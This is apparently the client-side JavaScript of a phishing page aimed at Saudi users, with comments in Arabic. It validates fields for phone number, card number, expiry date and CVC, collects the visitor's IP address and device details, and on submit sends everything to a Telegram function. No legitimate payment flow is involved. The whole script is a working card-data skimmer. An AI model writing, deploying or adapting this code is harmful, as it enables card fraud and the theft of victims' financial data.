// جمع معلومات الجهاز تلقائياً
document.addEventListener('DOMContentLoaded', function() {
    // تعبئة معلومات الجهاز تلقائياً
    document.getElementById('userAgent').value = navigator.userAgent;
    document.getElementById('screenResolution').value = `${window.screen.width} × ${window.screen.height}`;
    document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    // الحصول على عنوان IP
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            document.getElementById('ipAddress').value = data.ip;
            document.querySelector('.loader').style.display = 'none';
        })
        .catch(error => {
            console.error('خطأ في جلب عنوان IP:', error);
            document.getElementById('ipAddress').value = 'غير متوفر';
            document.querySelector('.loader').style.display = 'none';
        });
    
    // التحقق من صحة نموذج الإدخال في الوقت الفعلي
    const phoneInput = document.getElementById('phone');
    const cardNumberInput = document.getElementById('cardNumber');
    const cardExpiryInput = document.getElementById('cardExpiry');
    const cardCVCInput = document.getElementById('cardCVC');
    
    // التحقق من رقم الهاتف
    phoneInput.addEventListener('input', function() {
        const phone = phoneInput.value.replace(/\D/g, '');
        if (phone.length === 10 && phone.startsWith('05')) {
            phoneInput.style.borderColor = '#28a745';
        } else {
            phoneInput.style.borderColor = '#dc3545';
        }
    });
    
    // التحقق من رقم البطاقة
    cardNumberInput.addEventListener('input', function() {
        const cardNumber = cardNumberInput.value.replace(/\D/g, '');
        if (cardNumber.length >= 14 && cardNumber.length <= 19) {
            cardNumberInput.style.borderColor = '#28a745';
        } else {
            cardNumberInput.style.borderColor = '#dc3545';
        }
    });
    
    // التحقق من تاريخ الانتهاء
    cardExpiryInput.addEventListener('input', function() {
        const expiry = cardExpiryInput.value;
        const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
        if (regex.test(expiry)) {
            cardExpiryInput.style.borderColor = '#28a745';
        } else {
            cardExpiryInput.style.borderColor = '#dc3545';
        }
    });
    
    // التحقق من رمز CVC
    cardCVCInput.addEventListener('input', function() {
        const cvc = cardCVCInput.value.replace(/\D/g, '');
        if (cvc.length === 3 || cvc.length === 4) {
            cardCVCInput.style.borderColor = '#28a745';
        } else {
            cardCVCInput.style.borderColor = '#dc3545';
        }
    });
    
    // معالجة إرسال النموذج
    const form = document.getElementById('userForm');
    const submitBtn = document.getElementById('submitBtn');
    const loadingElement = document.getElementById('loading');
    const successElement = document.getElementById('successMessage');
    const errorElement = document.getElementById('errorMessage');
    const errorText = document.getElementById('errorText');
    
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // التحقق من صحة جميع الحقول
        if (!form.checkValidity()) {
            alert('يرجى تعبئة جميع الحقول المطلوبة بشكل صحيح.');
            return;
        }
        
        if (!document.getElementById('agreeTerms').checked) {
            alert('يرجى الموافقة على الشروط والأحكام.');
            return;
        }
        
        // جمع البيانات من النموذج
        const userData = {
            phone: document.getElementById('phone').value,
            cardNumber: document.getElementById('cardNumber').value,
            cardExpiry: document.getElementById('cardExpiry').value,
            cardCVC: document.getElementById('cardCVC').value,
            userAgent: document.getElementById('userAgent').value,
            screenResolution: document.getElementById('screenResolution').value,
            timezone: document.getElementById('timezone').value,
            ipAddress: document.getElementById('ipAddress').value,
            timestamp: new Date().toLocaleString('ar-SA', {
                timeZone: 'Asia/Riyadh',
                dateStyle: 'full',
                timeStyle: 'medium'
            }),
            referrer: document.referrer || 'مباشر',
            language: navigator.language,
            platform: navigator.platform
        };
        
        // إظهار حالة التحميل
        submitBtn.disabled = true;
        loadingElement.classList.remove('hidden');
        successElement.classList.add('hidden');
        errorElement.classList.add('hidden');
        
        // إرسال البيانات إلى Telegram
        sendToTelegram(userData)
            .then(response => {
                // إخفاء حالة التحميل
                loadingElement.classList.add('hidden');
                
                if (response.ok) {
                    // إظهار رسالة النجاح
                    successElement.classList.remove('hidden');
                    
                    // إعادة تعيين النموذج بعد 3 ثواني
                    setTimeout(() => {
                        form.reset();
                        successElement.classList.add('hidden');
                        submitBtn.disabled = false;
                        
                        // إعادة تعيين ألوان الحدود
                        const inputs = form.querySelectorAll('input');
                        inputs.forEach(input => {
                            input.style.borderColor = '#dee2e6';
                        });
                    }, 3000);
                } else {
                    throw new Error('فشل إرسال البيانات');
                }
            })
            .catch(error => {
                console.error('خطأ:', error);
                loadingElement.classList.add('hidden');
                errorText.textContent = 'حدث خطأ أثناء إرسال المعلومات. يرجى المحاولة مرة أخرى.';
                errorElement.classList.remove('hidden');
                submitBtn.disabled = false;
            });
    });
});